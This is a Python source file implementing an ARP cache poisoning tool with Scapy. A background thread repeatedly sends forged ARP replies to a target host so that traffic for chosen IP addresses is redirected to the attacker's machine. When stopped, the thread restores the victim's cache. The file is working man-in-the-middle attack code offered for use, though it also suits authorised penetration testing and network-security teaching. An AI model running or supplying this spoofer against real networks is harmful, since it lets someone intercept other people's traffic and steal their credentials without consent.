from scapy import packet
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
import time
import threading


class ARPSpoofing(threading.Thread):

    def __init__(self, interface: str, target_mac: str, target_ip: str, spoofed_ips: list, hosts: dict, delay: int):
        """
        Starts ARP spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param target_mac: mac of the host that will be poisoned
            :param target_ip: ip of the host that will be poisoned
            :param spoofed_ips: ip addresses for which false ARP cache entries will be created
            :param hosts: dictionary containing info on all discovered hosts, used for restoring caches
            :param delay: delay between outgoing spoofed arp replies
        """
        super(ARPSpoofing, self).__init__()
        self.interface = interface
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.spoofed_ips = spoofed_ips
        self.hosts = hosts
        self.delay = delay
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def arp_spoof() -> None:

            def create_spoofed_arp_answer(spoofed_ip, target_ip, target_mac) -> packet:
                """
                Creates a spoofed ARP answer packet with source MAC set to host

                    :param spoofed_ip: ip that will be used to poison ARP cache of target,
                        i.e. who attacker claims to be
                    :param target_ip: ip of the host that will be spoofed
                    :param target_mac: mac of the host that will be spoofed
                    :return: Spoofed ARP packet that can be used to poison ARP cache
                """

                # Create Ethernet and ARP layers, src MAC is not required as it is host MAC by default
                resp_ether = Ether(dst=target_mac)
                resp_arp = ARP(
                    op=2,   # 2 = ARP response, 1 = ARP request
                    psrc=spoofed_ip,
                    pdst=target_ip,
                    hwdst=target_mac,
                )
                spoofed_resp = resp_ether / resp_arp

                return spoofed_resp

            for ip in self.spoofed_ips:
                spoofed_ans = create_spoofed_arp_answer(ip, self.target_ip, self.target_mac)
                # TODO: Set verbose to False or make it configurable
                sendp(spoofed_ans, iface=self.interface, verbose=True)

        print("Now ARP spoofing...")
        while True:
            if self.is_stopped():
                print("Stopped ARP spoofing")
                print("Now restoring ARP cache of victim")
                for spoofed_ip in self.spoofed_ips:
                    for mac in self.hosts[self.interface]:
                        for ip in self.hosts[self.interface][mac]:
                            if spoofed_ip == ip:
                                # TODO: Move this to function:
                                resp_ether = Ether(dst=self.target_mac, src=mac)
                                resp_arp = ARP(
                                    op=2,  # 2 = ARP response, 1 = ARP request
                                    psrc=spoofed_ip,
                                    pdst=self.target_ip,
                                    hwsrc=mac,
                                    hwdst=self.target_mac
                                )
                                restore_resp = resp_ether / resp_arp
                                sendp(restore_resp, iface=self.interface, verbose=False)

                return
            arp_spoof()
            time.sleep(self.delay)

